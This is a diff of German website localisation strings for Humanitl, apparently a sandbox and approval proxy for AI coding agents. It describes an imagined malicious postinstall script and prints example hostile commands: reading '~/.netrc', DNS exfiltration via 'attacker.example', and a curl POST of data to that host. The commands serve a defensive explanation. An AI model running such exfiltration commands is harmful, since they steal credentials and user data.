@@ -81,32 +81,203 @@ const de = {
       },
     ],
   },
-  guarantees: {
-    title: 'Physik statt Vertrauen.',
-    lede: 'Drei Garantien, alle mit einem Befehl prüfbar, der eine eigene kurzlebige Sandbox startet. Jede Sitzung misst sie, nachdem der Agent gestartet ist, und ein rotes Ergebnis stoppt die Sitzung. Unter Linux mit bubblewrap und seccomp, unter macOS mit Seatbelt. Offen und sichtbar bleiben zwei Kanäle: der Projektordner und die erklärte Verbindung zum Sprachmodell.',
-    items: [
-      {
-        title: 'Kein Weg nach draußen.',
-        text: 'Unter Linux hat die Sandbox kein Netzwerk-Interface. Unter macOS endet jede Verbindung außer der Tür mit EPERM.',
-      },
-      {
-        title: 'Genau eine Tür.',
-        text: 'Unter Linux führt ein einziger Socket aus der Sandbox, unter macOS der Proxy-Socket und der Loopback-Port der Sitzung. Alles endet bei Humanitl, dort entscheiden Regeln oder du.',
-      },
-      {
-        title: 'Der Kernel hält dicht.',
-        text: 'seccomp unter Linux, ein Seatbelt-Profil unter macOS: Der Agent kann sich keine neue Tür öffnen.',
-      },
-    ],
-    check: 'Alle drei auf einmal prüfen:',
-    more: 'Die Sicherheitsargumentation',
-  },
   closing: {
-    title: 'Behalte die Hand am Netz.',
-    text: 'Kostenlos und quelloffen. Kein Konto, keine Cloud: Humanitl läuft auf deinem Rechner.',
     cta: 'Humanitl herunterladen',
     ctaMac: 'Humanitl für macOS herunterladen',
     ctaLinux: 'Humanitl für Linux herunterladen',
+  },
+  home: {
+    attack: {
+      title: 'Vier Versuche. Einer kommt bis zu dir.',
+      lede: 'Dein Agent installiert ein Paket, das du nicht kennst. Dessen postinstall-Skript läuft mit, in der Sandbox. Das tut es dort:',
+      attempt: 'Das Skript versucht',
+      stop: 'Wo es endet',
+      inside: 'Sandbox',
+      outside: 'Host',
+      rows: [
+        {
+          state: 'stop',
+          title: 'Ein Token lesen',
+          cmd: 'cat ~/.netrc',
+          verdict: 'Nichts zu lesen',
+          text: 'Dein Home-Verzeichnis liegt außerhalb der Sandbox. Gibt es `.env` oder `.npmrc` im Projekt, sind sie maskiert.',
+          systems: [
+            { os: 'Linux', text: 'Ein leeres `/home/agent`, vom Host nichts.' },
+            { os: 'macOS', text: 'Aus `/Users` nur, was zur Sitzung gehört.' },
+          ],
+        },
+        {
+          state: 'stop',
+          title: 'Daten in einem DNS-Namen verstecken',
+          cmd: 'dig $DATEN.attacker.example',
+          verdict: 'EPERM',
+          text: 'In der Sandbox löst nichts Namen auf, und die Frage verlässt sie nicht.',
+          systems: [
+            { os: 'Linux', text: 'Kein `/etc/resolv.conf`, ein UDP-Socket endet am Filter.' },
+            { os: 'macOS', text: '`sendto` wird verweigert, `mDNSResponder` ist nicht erreichbar.' },
+          ],
+        },
+        {
+          state: 'stop',
+          title: 'Einen rohen Socket öffnen',
+          cmd: 'socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)',
+          verdict: 'EPERM',
+          text: 'Der Socket entsteht gar nicht erst.',
+          systems: [
+            { os: 'Linux', text: 'seccomp lässt nur `SOCK_STREAM` durch.' },
+            { os: 'macOS', text: 'Verweigert bei `socket(2)`.' },
+          ],
+        },
+        {
+          state: 'held',
+          title: 'Mit curl nach draußen',
+          cmd: 'curl -d @daten https://attacker.example/',
+          verdict: 'Wartet auf dich',
+          text: 'curl nimmt die Tür zum Proxy. Entscheidet keine Regel über die Anfrage, hält der Proxy sie an und zeigt dir Ziel, Header und Body.',
+          systems: [{ os: 'Linux, macOS', text: 'Unter beiden Systemen derselbe Halt am Proxy.' }],
+        },
+      ],
+      note: 'Ein gedachter Ablauf, kein Mitschnitt. Das Verhalten an jeder Station ist dokumentiert, die Sperren prüfen die Ausbruchstests in der CI.',
+      more: 'Der ganze Weg einer Anfrage',
+    },
+    why: {
+      title: 'Warum das hält.',
+      lede: 'Die Proxy-Variablen sind nur der bequeme Weg. Durchgesetzt wird außerhalb des Agenten: vom Kernel und vom Proxy auf deinem Rechner.',
+      figTitle: 'Der Weg einer Anfrage',
+      figDesc:
+        'Ein Versuch ohne Proxy endet an der Wand der Sandbox. Die Anfrage durch die Tür wird im Proxy gehalten: Der Name bleibt Text, Header und Body sind lesbar. Erst nach deiner Freigabe wird der Name einmal aufgelöst, die Anfrage geht zum Ziel und wird aufgezeichnet.',
+      replay: 'Noch einmal abspielen',
+      fig: {
+        sandbox: 'Sandbox',
+        agent: 'Agent',
+        ghost: 'ohne Proxy',
+        door: 'Tür',
+        ca: 'ca.crt: nur hier',
+        proxy: 'Proxy auf deinem Rechner',
+        name: 'Name bleibt Text',
+        body: 'Body lesbar',
+        you: 'Du',
+        dnsNote: 'erst jetzt, einmal',
+        dest: 'Ziel',
+        audit: 'aufgezeichnet',
+      },
+      claims: [
+        {
+          title: 'Wer den Proxy übergeht, scheitert.',
+          text: 'Ein Werkzeug, das `HTTP_PROXY` ignoriert, trifft auf die Wand: unter Linux mit `ENETUNREACH`, unter macOS mit `EPERM`.',
+        },
+        {
+          title: 'Ein Name wird erst nach der Freigabe aufgelöst.',
+          text: 'Schon eine DNS-Abfrage kann Daten tragen. Deshalb hält Humanitl den Host als Text und fragt erst nach der Freigabe, genau einmal. ESC-3 prüft das am Log eines aufzeichnenden Nameservers.',
+        },
+        {
+          title: 'HTTPS-Inhalt bleibt sichtbar.',
+          text: 'Jede Installation erzeugt eine eigene CA. Ihr öffentliches Zertifikat liegt nur in der Sandbox, nie im Vertrauensspeicher deines Systems. Programme mit fest eingebautem Zertifikat scheitern sichtbar.',
+        },
+      ],
+      check: 'Die Sandbox selbst prüfen:',
+      checkNote:
+        '`humanitl sandbox check` startet eine eigene kurzlebige Sandbox. Dieselben drei Punkte misst jede Sitzung, nachdem der Agent gestartet ist; ein rotes Ergebnis stoppt die Sitzung.',
+      more: 'Selbst nachprüfen',
+    },
+    open: {
+      title: 'Was offen bleibt.',
+      statement: 'Humanitl sagt nicht, dass keine Daten herauskommen können.',
+      lede: 'Es sagt: Über das Netz gehen nur Anfragen hinaus, die du oder eine Regel freigegeben hast, und der erklärte Passthrough zum Modell-Host.',
+      items: [
+        {
+          title: 'Dein Modell',
+          text: 'Ohne Halt geht nur, was zum erklärten Passthrough passt: Host, Port, Schema, Methode und Endpunkt. Anderes an denselben Host, etwa `POST /api/pull`, wird gehalten. Der Passthrough wird aufgezeichnet und gescannt, ein Fund warnt nur. Der Host sieht jeden Prompt, also gehört er zu dem, dem du vertraust.',
+        },
+        {
+          title: '`/work`',
+          text: 'Der Projektordner ist beschreibbar. Was der Agent dort ablegt, kann später ein Mensch hinaustragen.',
+        },
+        {
+          title: 'Freigegebene Anfragen',
+          text: 'Was du freigibst oder eine Regel erlaubt, geht hinaus. Lies also, was du freigibst.',
+        },
+        {
+          title: 'Antworten und WebSocket-Frames',
+          text: 'Sie werden aufgezeichnet, nicht gehalten. Eine Antwort kann Prompt-Injection enthalten.',
+        },
+      ],
+      quietTitle: 'Drei weitere erklärte Kanäle, ohne Datenweg nach draußen',
+      quiet: [
+        { title: 'Terminal-Ausgabe', text: 'Sie kommt vom Agenten: gefiltert, nicht vertrauenswürdig.' },
+        { title: 'Hostnamen', text: 'Im Klartext in der Aufzeichnung und in jedem Export. Der Export trägt auch Pfade, Header und Bodys im Klartext und sagt das vorher.' },
+        { title: 'Paket-Caches', text: 'Je Projekt, nie über Vertrauensstufen geteilt. Sie tragen Daten zwischen Sitzungen dieses Projekts.' },
+      ],
+      macos: 'Unter macOS gibt es an fünf Punkten weniger als unter Linux. Jeder ist benannt.',
+      macosMore: 'Die Unterschiede unter macOS',
+      more: 'Alle Grenzen im Einzelnen',
+    },
+    daily: {
+      title: 'Was es im Alltag kostet.',
+      lede: 'Aufmerksamkeit. Am meisten beim ersten Lauf, danach hängt es an deinen Regeln.',
+      shotHeld: 'Erster Lauf: Anfragen warten',
+      shotRules: 'Regeln: was keine trifft, wird gehalten',
+      beats: [
+        {
+          title: 'Der erste Lauf hält viel an.',
+          text: 'Solange keine Regel passt, wartet eine Anfrage auf dich. Ohne Paket-Cache kostet schon eine Installation Freigaben.',
+        },
+        {
+          title: 'Regeln machen es ruhig.',
+          text: 'Der Pfeil neben Erlauben merkt eine Entscheidung als Regel: für die Sitzung, eine Stunde oder dauerhaft. Sie lässt sich eng fassen, etwa `GET` auf `*.github.com`, während `POST` weiter fragt.',
+        },
+        {
+          title: 'Der Preis einer Regel.',
+          text: 'Was eine `allow`-Regel trifft, geht ohne Halt hinaus. Du siehst es nicht mehr vorher, nur noch danach im Verlauf.',
+        },
+      ],
+      timeout: {
+        title: 'Wenn niemand antwortet',
+        verdict: 'Blockiert, nie erlaubt.',
+        text: 'Bleibt eine gehaltene Anfrage 300 Sekunden ohne Antwort (Standardwert), wird sie blockiert, und der Agent bekommt `504`. Ein blockierter Agent ist das vorgesehene Ergebnis.',
+      },
+      more: 'Die Regelsprache',
+    },
+    support: {
+      title: 'Womit es läuft. Womit nicht.',
+      lede: 'Der Stand heute, damit du es nicht erst nach der Installation erfährst.',
+      topic: 'Bereich',
+      yes: 'Läuft',
+      no: 'Läuft nicht',
+      rows: [
+        {
+          topic: 'Agenten',
+          yes: ['OpenCode und pi, je mit eigenem Adapter', 'Dein eigener Adapter, in den Daemon übersetzt'],
+          no: ['Kein Adapter für Claude Code, Codex oder Aider'],
+        },
+        {
+          topic: 'Modelle',
+          yes: ['Jeder OpenAI-kompatible Server oder Ollama'],
+          no: [],
+        },
+        {
+          topic: 'Systeme',
+          yes: ['Linux x86_64: Debian 13, Ubuntu 24.04 und neuer', 'macOS 12 oder neuer, Apple Silicon und Intel; getestet mit 15 und 27'],
+          no: ['Windows wird nicht unterstützt'],
+        },
+      ],
+      more: 'Agent-Profile und Adapter',
+    },
+    maturity: {
+      title: 'Früh und offen.',
+      lede: 'Humanitl läuft auf deinem Rechner und schickt uns nichts: kein Konto, keine Telemetrie, keine Absturzberichte.',
+      facts: [
+        { k: 'Version', v: '0.0.x' },
+        { k: 'Projekt', v: 'Ein Maintainer' },
+        { k: 'Lizenz', v: 'GPL-3.0' },
+        { k: 'Releases', v: 'Unsigniert vor 1.0.0' },
+      ],
+      sumsTitle: 'Was `SHA256SUMS` leistet',
+      sumsYes: 'Schützt vor einem beschädigten Download.',
+      sumsNo: 'Schützt nicht vor einem manipulierten Release.',
+      sumsNote: 'Signierte Pakete kommen mit 1.0.0. Unter macOS ist die App nur ad hoc signiert, den ersten Start erlaubst du einmal in den Systemeinstellungen.',
+      more: 'Alle Downloads und Prüfsummen',
+    },
   },
   download: {
     title: 'Download',
